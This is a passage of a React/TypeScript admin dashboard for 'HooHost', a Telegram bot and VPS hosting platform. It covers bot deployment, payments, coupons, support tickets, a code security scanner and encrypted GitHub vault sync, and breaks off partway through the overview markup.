import React, { useState, useEffect } from 'react';
import {
  Server,
  Cpu,
  HardDrive,
  Activity,
  Terminal,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Key,
  RefreshCw,
  Play,
  Square,
  RotateCcw,
  Trash2,
  Plus,
  Search,
  CheckCircle2,
  XCircle,
  AlertTriangle,
  Clock,
  CreditCard,
  Ticket,
  Tag,
  Settings,
  Send,
  Radio,
  Database,
  Lock,
  Layers,
  Globe,
  Users,
  DollarSign,
  Copy,
  Check,
  Sparkles,
  Sliders,
  ChevronRight,
  Eye,
  FileCode,
  ShieldX
} from 'lucide-react';

interface SystemStatus {
  status: string;
  version: string;
  platform: string;
  node_version: string;
  uptime_seconds: number;
  load_average?: number[];
  memory: {
    total_mb: number;
    used_mb: number;
    free_mb: number;
    usage_percent: number;
  };
  cpu: {
    model: string;
    cores: number;
    load_percent: number;
  };
  stats: {
    active_bots: number;
    total_bots: number;
    total_users: number;
    total_revenue_usd: number;
    open_tickets: number;
    maintenance_mode: boolean;
    vault_sync_active: boolean;
  };
}

interface BotItem {
  id: string;
  name: string;
  owner_id: string;
  owner_username: string;
  runtime: 'python' | 'node';
  entrypoint: string;
  plan: string;
  status: 'running' | 'stopped' | 'error';
  cpu_usage: number;
  memory_mb: number;
  memory_limit_mb: number;
  pid: number | null;
  uptime_seconds: number;
  created_at: string;
  node: string;
  env: Record<string, string>;
  logs: string[];
}

interface NodeItem {
  id: string;
  name: string;
  region: string;
  ip: string;
  status: string;
  cpu_cores: number;
  cpu_percent: number;
  ram_total_gb: string;
  ram_used_gb: string;
  active_containers: number;
  ping_ms: number;
  type: string;
}

interface PlanItem {
  id: string;
  name: string;
  price_monthly_usd: number;
  price_bdt: number;
  cpus: string;
  ram_mb: number;
  pids_limit: number;
  storage_mb: number;
  bandwidth_gb: number;
  allowed_bots: number;
  features: string[];
  is_popular: boolean;
}

interface PaymentItem {
  id: string;
  user_id: string;
  username: string;
  amount: number;
  currency: string;
  method: string;
  status: 'completed' | 'pending_review' | 'rejected';
  plan: string;
  created_at: string;
  track_id: string;
  proof_note?: string;
}

interface TicketItem {
  id: string;
  user_id: string;
  username: string;
  subject: string;
  status: 'open' | 'pending' | 'resolved';
  priority: 'low' | 'medium' | 'high';
  created_at: string;
  messages: Array<{
    sender: string;
    role: string;
    text: string;
    time: string;
  }>;
}

interface CouponItem {
  code: string;
  discount_percent: number;
  max_uses: number;
  used_count: number;
  active: boolean;
  expires_at: string;
}

interface ScanResult {
  verdict: 'SAFE' | 'MANUAL_REVIEW' | 'REJECT';
  safety_score: number;
  total_findings: number;
  high_threats: number;
  review_needed: number;
  findings: Array<{
    category: string;
    rule: string;
    match: string;
    line: number;
  }>;
  scanner: string;
  scanned_at: string;
}

export default function App() {
  const [activeTab, setActiveTab] = useState<'overview' | 'bots' | 'nodes' | 'plans' | 'payments' | 'coupons' | 'tickets' | 'scanner' | 'vault' | 'settings'>('overview');
  
  // Data States
  const [status, setStatus] = useState<SystemStatus | null>(null);
  const [bots, setBots] = useState<BotItem[]>([]);
  const [nodes, setNodes] = useState<NodeItem[]>([]);
  const [plans, setPlans] = useState<PlanItem[]>([]);
  const [payments, setPayments] = useState<PaymentItem[]>([]);
  const [tickets, setTickets] = useState<TicketItem[]>([]);
  const [coupons, setCoupons] = useState<CouponItem[]>([]);
  const [settings, setSettings] = useState<any>({});
  const [loading, setLoading] = useState<boolean>(true);
  const [refreshing, setRefreshing] = useState<boolean>(false);
  const [copiedCode, setCopiedCode] = useState<string | null>(null);

  // Modals
  const [showDeployModal, setShowDeployModal] = useState<boolean>(false);
  const [selectedBotLogs, setSelectedBotLogs] = useState<BotItem | null>(null);
  const [showAddCouponModal, setShowAddCouponModal] = useState<boolean>(false);
  const [activeTicket, setActiveTicket] = useState<TicketItem | null>(null);
  const [ticketReplyText, setTicketReplyText] = useState<string>('');
  
  // New Bot Form
  const [newBotName, setNewBotName] = useState<string>('');
  const [newBotRuntime, setNewBotRuntime] = useState<'python' | 'node'>('python');
  const [newBotPlan, setNewBotPlan] = useState<string>('basic');
  const [newBotEntry, setNewBotEntry] = useState<string>('bot.py');
  const [newBotEnv, setNewBotEnv] = useState<string>('TOKEN=123456:ABC-DEF\nMODE=production');

  // Coupon Form
  const [newCouponCode, setNewCouponCode] = useState<string>('');
  const [newCouponDiscount, setNewCouponDiscount] = useState<number>(20);
  const [newCouponMaxUses, setNewCouponMaxUses] = useState<number>(100);

  // Broadcast Form
  const [broadcastMessage, setBroadcastMessage] = useState<string>('');
  const [broadcastPin, setBroadcastPin] = useState<boolean>(true);
  const [broadcastAlert, setBroadcastAlert] = useState<string | null>(null);

  // Security Scanner State
  const [scannerCode, setScannerCode] = useState<string>(`import os
import telebot
import subprocess

bot = telebot.TeleBot("YOUR_BOT_TOKEN")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to HooHost Bot!")

@bot.message_handler(commands=['status'])
def send_status(message):
    # Safe telemetry query
    bot.reply_to(message, "System online and healthy.")

bot.polling()`);
  const [scanResult, setScanResult] = useState<ScanResult | null>(null);
  const [scanning, setScanning] = useState<boolean>(false);

  // Vault Sync State
  const [vaultInfo, setVaultInfo] = useState<any>(null);
  const [syncingVault, setSyncingVault] = useState<boolean>(false);
  const [vaultMessage, setVaultMessage] = useState<string | null>(null);
  const [vaultRepo, setVaultRepo] = useState<string>('Lord-Cipher/cipher-vault');
  const [vaultBranch, setVaultBranch] = useState<string>('main');
  const [vaultToken, setVaultToken] = useState<string>('');
  const [vaultKey, setVaultKey] = useState<string>('');
  const [savingVaultConfig, setSavingVaultConfig] = useState<boolean>(false);
  const [showVaultKey, setShowVaultKey] = useState<boolean>(false);
  const [copiedKey, setCopiedKey] = useState<boolean>(false);

  // Fetch all initial data
  const fetchData = async () => {
    try {
      setRefreshing(true);
      const [
        statusRes,
        botsRes,
        nodesRes,
        plansRes,
        paymentsRes,
        ticketsRes,
        couponsRes,
        settingsRes,
        vaultRes
      ] = await Promise.all([
        fetch('/api/status').then(r => r.json()),
        fetch('/api/bots').then(r => r.json()),
        fetch('/api/nodes').then(r => r.json()),
        fetch('/api/plans').then(r => r.json()),
        fetch('/api/payments').then(r => r.json()),
        fetch('/api/tickets').then(r => r.json()),
        fetch('/api/coupons').then(r => r.json()),
        fetch('/api/settings').then(r => r.json()),
        fetch('/api/vault').then(r => r.json())
      ]);

      setStatus(statusRes);
      setBots(botsRes);
      setNodes(nodesRes);
      setPlans(plansRes);
      setPayments(paymentsRes);
      setTickets(ticketsRes);
      setCoupons(couponsRes);
      setSettings(settingsRes);
      setVaultInfo(vaultRes);
      if (vaultRes) {
        setVaultRepo(vaultRes.repo || 'Lord-Cipher/cipher-vault');
        setVaultBranch(vaultRes.branch || 'main');
        if (vaultRes.key) setVaultKey(vaultRes.key);
        if (vaultRes.token) setVaultToken(vaultRes.token);
      }

      // Keep active ticket in sync if selected
      if (activeTicket) {
        const updated = ticketsRes.find((t: TicketItem) => t.id === activeTicket.id);
        if (updated) setActiveTicket(updated);
      }
      // Keep active bot logs in sync if selected
      if (selectedBotLogs) {
        const updated = botsRes.find((b: BotItem) => b.id === selectedBotLogs.id);
        if (updated) setSelectedBotLogs(updated);
      }
    } catch (err) {
      console.error("Failed to load HooHost platform data:", err);
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 10000); // Polling every 10s
    return () => clearInterval(interval);
  }, []);

  // Bot Actions
  const handleBotAction = async (id: string, action: 'start' | 'stop' | 'restart') => {
    try {
      const res = await fetch(`/api/bots/${id}/action`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action })
      });
      if (res.ok) {
        fetchData();
      }
    } catch (e) {
      console.error(e);
    }
  };

  const handleDeleteBot = async (id: string) => {
    if (!confirm('Are you sure you want to terminate and delete this bot instance?')) return;
    try {
      const res = await fetch(`/api/bots/${id}`, { method: 'DELETE' });
      if (res.ok) {
        if (selectedBotLogs?.id === id) setSelectedBotLogs(null);
        fetchData();
      }
    } catch (e) {
      console.error(e);
    }
  };

  const handleDeployBot = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newBotName.trim()) return;

    // Parse env strings
    const envObj: Record<string, string> = {};
    newBotEnv.split('\n').forEach(line => {
      const parts = line.split('=');
      if (parts.length >= 2) {
        envObj[parts[0].trim()] = parts.slice(1).join('=').trim();
      }
    });

    try {
      const res = await fetch('/api/bots', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: newBotName,
          runtime: newBotRuntime,
          plan: newBotPlan,
          entrypoint: newBotEntry,
          env: envObj
        })
      });
      if (res.ok) {
        setShowDeployModal(false);
        setNewBotName('');
        fetchData();
      }
    } catch (e) {
      console.error(e);
    }
  };

  // Payment Verification
  const handleVerifyPayment = async (id: string, newStatus: 'completed' | 'rejected') => {
    try {
      const res = await fetch(`/api/payments/${id}/verify`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: newStatus })
      });
      if (res.ok) {
        fetchData();
      }
    } catch (e) {
      console.error(e);
    }
  };

  // Coupons
  const handleCreateCoupon = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newCouponCode.trim()) return;
    try {
      const res = await fetch('/api/coupons', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          code: newCouponCode,
          discount_percent: newCouponDiscount,
          max_uses: newCouponMaxUses
        })
      });
      if (res.ok) {
        setShowAddCouponModal(false);
        setNewCouponCode('');
        fetchData();
      }
    } catch (e) {
      console.error(e);
    }
  };

  const handleDeleteCoupon = async (code: string) => {
    try {
      const res = await fetch(`/api/coupons/${code}`, { method: 'DELETE' });
      if (res.ok) fetchData();
    } catch (e) {
      console.error(e);
    }
  };

  // Ticket Reply
  const handleSendTicketReply = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!activeTicket || !ticketReplyText.trim()) return;
    try {
      const res = await fetch(`/api/tickets/${activeTicket.id}/reply`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          text: ticketReplyText,
          status: 'pending'
        })
      });
      if (res.ok) {
        setTicketReplyText('');
        fetchData();
      }
    } catch (e) {
      console.error(e);
    }
  };

  const handleResolveTicket = async (ticketId: string) => {
    try {
      const res = await fetch(`/api/tickets/${ticketId}/reply`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          text: "Ticket has been marked as resolved by Administrator.",
          status: 'resolved'
        })
      });
      if (res.ok) fetchData();
    } catch (e) {
      console.error(e);
    }
  };

  // Security Scanner
  const handleRunScan = async () => {
    setScanning(true);
    setScanResult(null);
    try {
      const res = await fetch('/api/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: scannerCode })
      });
      const data = await res.json();
      setScanResult(data);
    } catch (e) {
      console.error(e);
    } finally {
      setScanning(false);
    }
  };

  // Vault Sync
  const handleTriggerVaultSync = async () => {
    setSyncingVault(true);
    setVaultMessage(null);
    try {
      const res = await fetch('/api/vault/sync', { method: 'POST' });
      const data = await res.json();
      setVaultMessage(data.message);
      fetchData();
    } catch (e) {
      console.error(e);
      setVaultMessage("Vault sync failed. Verify GitHub token and Fernet key.");
    } finally {
      setSyncingVault(false);
    }
  };

  const handleSaveVaultConfig = async () => {
    setSavingVaultConfig(true);
    setVaultMessage(null);
    try {
      const res = await fetch('/api/vault/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          repo: vaultRepo,
          branch: vaultBranch,
          token: vaultToken,
          key: vaultKey
        })
      });
      const data = await res.json();
      setVaultMessage(data.message);
      fetchData();
    } catch (err) {
      console.error(err);
      setVaultMessage("Failed to update vault configuration.");
    } finally {
      setSavingVaultConfig(false);
    }
  };

  const handleGenerateVaultKey = async () => {
    setSavingVaultConfig(true);
    setVaultMessage(null);
    try {
      const res = await fetch('/api/vault/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ generate_key: true })
      });
      const data = await res.json();
      setVaultMessage("New 32-byte Fernet key generated and saved successfully!");
      if (data.config?.key) {
        setVaultKey(data.config.key);
      }
      fetchData();
    } catch (err) {
      console.error(err);
      setVaultMessage("Failed to generate new key.");
    } finally {
      setSavingVaultConfig(false);
    }
  };

  // Settings Update
  const handleToggleMaintenance = async () => {
    const nextVal = !settings.maintenance_mode;
    try {
      const res = await fetch('/api/settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ maintenance_mode: nextVal })
      });
      if (res.ok) {
        setSettings({ ...settings, maintenance_mode: nextVal });
        fetchData();
      }
    } catch (e) {
      console.error(e);
    }
  };

  // Broadcast Announcement
  const handleSendBroadcast = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!broadcastMessage.trim()) return;
    try {
      const res = await fetch('/api/broadcast', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: broadcastMessage,
          pin: broadcastPin
        })
      });
      const data = await res.json();
      setBroadcastAlert(`Broadcast dispatched to ${data.delivered_count} subscribers!`);
      setBroadcastMessage('');
      setTimeout(() => setBroadcastAlert(null), 5000);
    } catch (e) {
      console.error(e);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCode(text);
    setTimeout(() => setCopiedCode(null), 2000);
  };

  return (
    <div id="hoohost-app" className="min-h-screen bg-[#070b14] text-slate-100 flex flex-col selection:bg-cyan-500/30 selection:text-cyan-200">
      
      {/* Top Navbar */}
      <header id="top-navbar" className="border-b border-slate-800/80 bg-[#0c1220]/90 backdrop-blur sticky top-0 z-40 px-4 lg:px-8 py-3.5 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-cyan-600 to-indigo-600 flex items-center justify-center shadow-lg shadow-cyan-950/50 border border-cyan-400/30">
            <Server className="w-5 h-5 text-white" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="font-bold text-lg tracking-tight text-white flex items-center gap-1.5">
                HooHost <span className="text-cyan-400 text-xs px-2 py-0.5 rounded-md bg-cyan-950/80 border border-cyan-500/30 font-mono font-medium">v4.2 Cloud</span>
              </span>
              {settings.maintenance_mode && (
                <span className="text-xs px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/30 flex items-center gap-1">
                  <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-pulse"></span> Maintenance Mode
                </span>
              )}
            </div>
            <p className="text-xs text-slate-400">Telegram Bot & Cloud VPS Cluster Controller</p>
          </div>
        </div>

        {/* Live Gauges in Header */}
        <div className="hidden md:flex items-center gap-6">
          <div className="flex items-center gap-2 text-xs">
            <Cpu className="w-4 h-4 text-cyan-400" />
            <span className="text-slate-400">CPU Load:</span>
            <span className="font-mono font-semibold text-slate-200">{status?.cpu.load_percent ?? 12}%</span>
          </div>

          <div className="flex items-center gap-2 text-xs">
            <HardDrive className="w-4 h-4 text-indigo-400" />
            <span className="text-slate-400">RAM:</span>
            <span className="font-mono font-semibold text-slate-200">{status?.memory.used_mb ?? 512} / {status?.memory.total_mb ?? 4096} MB</span>
          </div>

          <div className="flex items-center gap-2 text-xs">
            <Activity className="w-4 h-4 text-emerald-400" />
            <span className="text-slate-400">Active Bots:</span>
            <span className="font-mono font-semibold text-emerald-400">{status?.stats.active_bots ?? 2}</span>
          </div>

          <button
            id="btn-refresh-telemetry"
            onClick={fetchData}
            title="Refresh Realtime Stats"
            className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition border border-slate-700/60"
          >
            <RefreshCw className={`w-4 h-4 ${refreshing ? 'animate-spin text-cyan-400' : ''}`} />
          </button>

          <button
            id="btn-deploy-top"
            onClick={() => setShowDeployModal(true)}
            className="px-3.5 py-1.5 rounded-lg bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-semibold text-xs flex items-center gap-1.5 shadow-md shadow-cyan-900/30 transition active:scale-95"
          >
            <Plus className="w-3.5 h-3.5 text-slate-950" />
            Deploy Bot
          </button>
        </div>
      </header>

      {/* Main Container */}
      <div className="flex-1 flex flex-col lg:flex-row">
        
        {/* Sidebar Navigation */}
        <aside id="sidebar-nav" className="w-full lg:w-64 border-b lg:border-b-0 lg:border-r border-slate-800/80 bg-[#090e1a] p-3 shrink-0 flex lg:flex-col gap-1 overflow-x-auto lg:overflow-x-visible">
          <button
            id="nav-tab-overview"
            onClick={() => setActiveTab('overview')}
            className={`flex items-center gap-2.5 px-3 py-2.5 rounded-lg text-sm font-medium transition text-left whitespace-nowrap ${
              activeTab === 'overview'
                ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/30'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
            }`}
          >
            <Activity className="w-4 h-4 shrink-0" />
            <span>Dashboard Overview</span>
          </button>

          <button
            id="nav-tab-bots"
            onClick={() => setActiveTab('bots')}
            className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-sm font-medium transition text-left whitespace-nowrap ${
              activeTab === 'bots'
                ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/30'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
            }`}
          >
            <div className="flex items-center gap-2.5">
              <Server className="w-4 h-4 shrink-0" />
              <span>Bot Instances</span>
            </div>
            <span className="text-xs px-2 py-0.5 rounded-full bg-slate-800 text-slate-300 font-mono font-normal">
              {bots.length}
            </span>
          </button>

          <button
            id="nav-tab-nodes"
            onClick={() => setActiveTab('nodes')}
            className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-sm font-medium transition text-left whitespace-nowrap ${
              activeTab === 'nodes'
                ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/30'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
            }`}
          >
            <div className="flex items-center gap-2.5">
              <Layers className="w-4 h-4 shrink-0" />
              <span>Nodes & Clusters</span>
            </div>
            <span className="text-xs px-2 py-0.5 rounded-full bg-slate-800 text-slate-300 font-mono font-normal">
              {nodes.length}
            </span>
          </button>

          <button
            id="nav-tab-plans"
            onClick={() => setActiveTab('plans')}
            className={`flex items-center gap-2.5 px-3 py-2.5 rounded-lg text-sm font-medium transition text-left whitespace-nowrap ${
              activeTab === 'plans'
                ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/30'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
            }`}
          >
            <Sliders className="w-4 h-4 shrink-0" />
            <span>Plans & Quotas</span>
          </button>

          <button
            id="nav-tab-payments"
            onClick={() => setActiveTab('payments')}
            className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-sm font-medium transition text-left whitespace-nowrap ${
              activeTab === 'payments'
                ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/30'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
            }`}
          >
            <div className="flex items-center gap-2.5">
              <CreditCard className="w-4 h-4 shrink-0" />
              <span>Merchant & Pay</span>
            </div>
            {payments.filter(p => p.status === 'pending_review').length > 0 && (
              <span className="text-xs px-1.5 py-0.5 rounded-full bg-amber-500/30 text-amber-300 font-mono font-bold animate-pulse">
                {payments.filter(p => p.status === 'pending_review').length}
              </span>
            )}
          </button>

          <button
            id="nav-tab-coupons"
            onClick={() => setActiveTab('coupons')}
            className={`flex items-center gap-2.5 px-3 py-2.5 rounded-lg text-sm font-medium transition text-left whitespace-nowrap ${
              activeTab === 'coupons'
                ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/30'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
            }`}
          >
            <Tag className="w-4 h-4 shrink-0" />
            <span>Coupons</span>
          </button>

          <button
            id="nav-tab-tickets"
            onClick={() => setActiveTab('tickets')}
            className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-sm font-medium transition text-left whitespace-nowrap ${
              activeTab === 'tickets'
                ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/30'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
            }`}
          >
            <div className="flex items-center gap-2.5">
              <Ticket className="w-4 h-4 shrink-0" />
              <span>Support Desk</span>
            </div>
            {tickets.filter(t => t.status === 'open').length > 0 && (
              <span className="text-xs px-1.5 py-0.5 rounded-full bg-cyan-500/30 text-cyan-300 font-mono font-bold">
                {tickets.filter(t => t.status === 'open').length}
              </span>
            )}
          </button>

          <button
            id="nav-tab-scanner"
            onClick={() => setActiveTab('scanner')}
            className={`flex items-center gap-2.5 px-3 py-2.5 rounded-lg text-sm font-medium transition text-left whitespace-nowrap ${
              activeTab === 'scanner'
                ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/30'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
            }`}
          >
            <ShieldCheck className="w-4 h-4 shrink-0 text-cyan-400" />
            <span>Security Scanner</span>
          </button>

          <button
            id="nav-tab-vault"
            onClick={() => setActiveTab('vault')}
            className={`flex items-center gap-2.5 px-3 py-2.5 rounded-lg text-sm font-medium transition text-left whitespace-nowrap ${
              activeTab === 'vault'
                ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/30'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
            }`}
          >
            <Lock className="w-4 h-4 shrink-0 text-amber-400" />
            <span>Cipher Vault Sync</span>
          </button>

          <button
            id="nav-tab-settings"
            onClick={() => setActiveTab('settings')}
            className={`flex items-center gap-2.5 px-3 py-2.5 rounded-lg text-sm font-medium transition text-left whitespace-nowrap ${
              activeTab === 'settings'
                ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/30'
                : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/50'
            }`}
          >
            <Settings className="w-4 h-4 shrink-0" />
            <span>Bot & Config</span>
          </button>

          {/* Quick System Badge in Sidebar */}
          <div className="mt-auto hidden lg:block pt-4 border-t border-slate-800/60">
            <div className="bg-[#0f172a] rounded-xl p-3 border border-slate-800 text-xs">
              <div className="flex items-center justify-between text-slate-400 mb-2">
                <span>Cluster State</span>
                <span className="flex items-center gap-1 text-emerald-400 font-medium">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span> Live
                </span>
              </div>
              <div className="text-slate-300 font-mono text-[11px] truncate">
                {status?.platform || 'Linux Ubuntu 22.04 LTS'}
              </div>
              <div className="mt-2 pt-2 border-t border-slate-800 flex items-center justify-between text-[11px] text-slate-400">
                <span>Uptime</span>
                <span className="font-mono text-slate-300">{Math.floor((status?.uptime_seconds ?? 3600) / 3600)}h {Math.floor(((status?.uptime_seconds ?? 3600) % 3600) / 60)}m</span>
              </div>
            </div>
          </div>
        </aside>

        {/* Tab Content Canvas */}
        <main className="flex-1 p-4 lg:p-8 overflow-y-auto max-w-7xl mx-auto w-full">

          {/* TAB 1: OVERVIEW */}
          {activeTab === 'overview' && (
            <div id="view-overview" className="space-y-6">
              
              {/* Top Banner Alert if Maintenance Mode */}
              {settings.maintenance_mode && (
                <div className="p-4 rounded-xl bg-amber-950/40 border border-amber-500/40 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <AlertTriangle className="w-5 h-5 text-amber-400 shrink-0" />
                    <div>
                      <p className="font-semibold text-amber-200 text-sm">System Maintenance Mode is Active</p>
                      <p className="text-xs text-amber-300/80">New bot deployments and public Telegram user commands are currently restricted to admins.</p>
                    </div>
                  </div>
                  <button
                    onClick={handleToggleMaintenance}
                    className="px-3 py-1.5 rounded-lg bg-amber-600 hover:bg-amber-500 text-white font-medium text-xs transition"
                  >
                    Disable Maintenance
                  </button>
                </div>
              )}

              {/* Metric Cards Grid */}
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                
                <div className="bg-[#0f172a]/90 rounded-2xl p-5 border border-slate-800/80 shadow-sm relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-24 h-24 bg-cyan-500/5 rounded-full blur-2xl"></div>
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-xs font-medium text-slate-400 uppercase tracking-wider">Running Bots</span>
                    <div className="p-2 rounded-xl bg-cyan-950/80 border border-cyan-500/30 text-cyan-400">
                      <Server className="w-4 h-4" />
                    </div>
                  </div>
                  <div className="flex items-baseline gap-2">
                    <span className="text-3xl font-bold font-mono text-white tracking-tight">{status?.stats.active_bots ?? 0}</span>
                    <span className="text-xs text-slate-400">/ {status?.stats.total_bots ?? 0} deployed</span>
                  </div>
                  <div className="mt-3 flex items-center gap-1.5 text-xs text-emerald-400">
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>Sandbox runtime online</span>
                  </div>
                </div>

                <div className="bg-[#0f172a]/90 rounded-2xl p-5 border border-slate-800/80 shadow-sm relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-24 h-24 bg-indigo-500/5 rounded-full blur-2xl"></div>
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-xs font-medium text-slate-400 uppercase tracking-wider">Total Users</span>
                    <div className="p-2 rounded-xl bg-indigo-950/80 border border-indigo-500/30 text-indigo-400">
                      <Users className="w-4 h-4" />
                    </div>
                  </div>
                  <div className="flex items-baseline gap-2">
                    <span className="text-3xl font-bold font-mono text-white tracking-tight">{status?.stats.total_users ?? 3}</span>
                    <span className="text-xs text-slate-400">subscribers</span>
                  </div>
                  <div className="mt-3 flex items-center gap-1.5 text-xs text-indigo-400">
                    <Globe className="w-3.5 h-3.5" />
                    <span>Telegram Bot community</span>
                  </div>
                </div>

                <div className="bg-[#0f172a]/90 rounded-2xl p-5 border border-slate-800/80 shadow-sm relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-24 h-24 bg-emerald-500/5 rounded-full blur-2xl"></div>
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-xs font-medium text-slate-400 uppercase tracking-wider">Platform Revenue</span>
                    <div className="p-2 rounded-xl bg-emerald-950/80 border border-emerald-500/30 text-emerald-400">
                      <DollarSign className="w-4 h-4" />
                    </div>
                  </div>
                  <div className="flex items-baseline gap-2">
                    <span className="text-3xl font-bold font-mono text-white tracking-tight">${status?.stats.total_revenue_usd.toFixed(2) ?? '0.00'}</span>
                    <span className="text-xs text-slate-400">USD</span>
                  </div>
                  <div className="mt-3 flex items-center gap-1.5 text-xs text-emerald-400">
                    <CreditCard className="w-3.5 h-3.5" />
                    <span>OxaPay Crypto & bKash</span>
                  </div>
                </div>

                <div className="bg-[#0f172a]/90 rounded-2xl p-5 border border-slate-800/80 shadow-sm relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-24 h-24 bg-amber-500/5 rounded-full blur-2xl"></div>
                  <div className="flex items-center justify-between mb-3">
                    <span className="text-xs font-medium text-slate-400 uppercase tracking-wider">Vault Backups</span>
                    <div className="p-2 rounded-xl bg-amber-950/80 border border-amber-500/30 text-amber-400">
                      <Lock className="w-4 h-4" />
                    </div>
                  </div>
                  <div className="flex items-baseline gap-2">
                    <span className="text-3xl font-bold font-mono text-white tracking-tight">AES-256</span>
                    <span className="text-xs text-amber-400/90 font-mono">Fernet</span>
                  </div>
                  <div className="mt-3 flex items-center gap-1.5 text-xs text-amber-400">
                    <Clock className="w-3.5 h-3.5" />
                    <span>Synced to GitHub main</span>
                  </div>
                </div>

              </div>

              {/* Main 2-Column Split: Active Bot Fleet & Live Diagnostics */}
              <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                
                {/* Column 1 & 2: Active Bots Table */}
                <div className="lg:col-span-2 bg-[#0f172a]/90 rounded-2xl border border-slate-800/80 p-5 space-y-4">
                  <div className="flex items-center justify-between">
                    <div>
                      <h3 className="font-bold text-slate-100 text-base flex items-center gap-2">
                        <Server className="w-4 h-4 text-cyan-400" />
                        Active Bot Fleet
                      </h3>
                      <p className="text-xs text-slate-400">Real-time status of user container sandboxes</p>
                    </div>
                    <button
                      onClick={() => setShowDeployModal(true)}
                      className="px-3 py-1.5 rounded-lg bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 text-xs font-semibold flex items-center gap-1.5 transition"
                    >
                      <Plus className="w-3.5 h-3.5" />
                      Add Bot
                    </button>
                  </div>

                  <div className="space-y-3">
                    {bots.length === 0 ? (
                      <div className="text-center py-8 text-slate-500 text-sm">
                        No bots running yet. Click Deploy Bot to launch one.
                      </div>
                    ) : (
                      bots.map(bot => (
                        <div
                          key={bot.id}
                          className="bg-[#0b101e] rounded-xl p-4 border border-slate-800 hover:border-slate-700 transition flex flex-col sm:flex-row sm:items-center justify-between gap-4"
                        >
                          <div className="space-y-1">
                            <div className="flex items-center gap-2">
                              <span className="font-bold text-white text-sm">{bot.name}</span>
                              <span className={`text-[10px] px-2 py-0.5 rounded-full font-mono font-medium flex items-center gap-1 ${
                                bot.status === 'running'
                                  ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                                  : 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
                              }`}>
                                <span className={`w-1.5 h-1.5 rounded-full ${bot.status === 'running' ? 'bg-emerald-400 animate-pulse' : 'bg-rose-400'}`}></span>
                                {bot.status.toUpperCase()}
                              </span>
                              <span className="text-[10px] px-2 py-0.5 rounded-md bg-slate-800 text-slate-300 font-mono">
                                {bot.runtime.toUpperCase()}
                              </span>
                              <span className="text-[10px] px-2 py-0.5 rounded-md bg-indigo-950 text-indigo-300 border border-indigo-800/60 font-mono">
                                {bot.plan.toUpperCase()}
                              </span>
                            </div>
